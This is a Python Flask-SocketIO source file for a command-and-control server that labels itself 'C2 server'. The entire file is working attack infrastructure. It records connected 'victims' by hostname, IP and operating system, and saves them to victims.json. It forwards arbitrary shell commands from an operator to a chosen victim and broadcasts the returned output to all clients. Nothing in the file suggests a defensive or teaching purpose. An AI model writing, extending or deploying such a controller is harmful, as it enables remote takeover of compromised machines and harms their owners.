import logging
import json
import os
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit

# Initialize Flask app and SocketIO with CORS support
app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# Set up logging with a better format
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Persistent storage file
VICTIMS_FILE = "victims.json"

# Load victims from file if exists, else use an empty dict
if os.path.exists(VICTIMS_FILE):
    with open(VICTIMS_FILE, "r") as f:
        victims = json.load(f)
else:
    victims = {}

def save_victims():
    """Save victims to a file for persistence."""
    with open(VICTIMS_FILE, "w") as f:
        json.dump(victims, f, indent=4)
    app.logger.info("Victims list saved to file.")

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_connect():
    app.logger.info(f'New connection established: {request.sid}')
    emit('connected', {'message': 'Connected to C2 server'})

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    app.logger.info(f'Client {sid} disconnected')

    if sid in victims:
        del victims[sid]  # Remove victim from the list
        #save_victims()  # Persist the update
        app.logger.info(f"Victim {sid} removed from connected victims.")
        emit('victim_disconnected', {'sid': sid}, broadcast=True)

@socketio.on('victim_info')
def handle_victim_info(data):
    sid = request.sid
    victim_data = {
        'hostname': data.get('hostname', 'Unknown'),
        'ip_address': data.get('ip_address', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'os_version': data.get('os_version', 'Unknown'),
        'sid': sid
    }

    # Update existing victim or add a new victim
    victims[sid] = victim_data
    #save_victims()  # Persist victim list
    app.logger.info(f"Victim {sid} connected or reconnected: {victim_data}")

    emit('victim_connected', {'victim': victim_data}, broadcast=True)

@socketio.on('send_command')
def handle_send_command(data):
    target_victim_sid = data.get('target')
    command = data.get('command')

    if not target_victim_sid or not command:
        app.logger.warning("Invalid command request: Missing target or command.")
        return

    if target_victim_sid in victims:
        app.logger.info(f"Sending command '{command}' to victim {target_victim_sid}")
        emit('execute_command', {'command': command}, room=target_victim_sid)
    else:
        app.logger.error(f"Target victim {target_victim_sid} not found")

@socketio.on('command_output')
def handle_command_output(data):
    app.logger.info(f"Received command output: {data}")
    emit('command_output', data, broadcast=True)  # Broadcast output to all clients

if __name__ == '__main__':
    app.logger.info("Server starting on port 8080")
    socketio.run(app, host="0.0.0.0", port=8080)

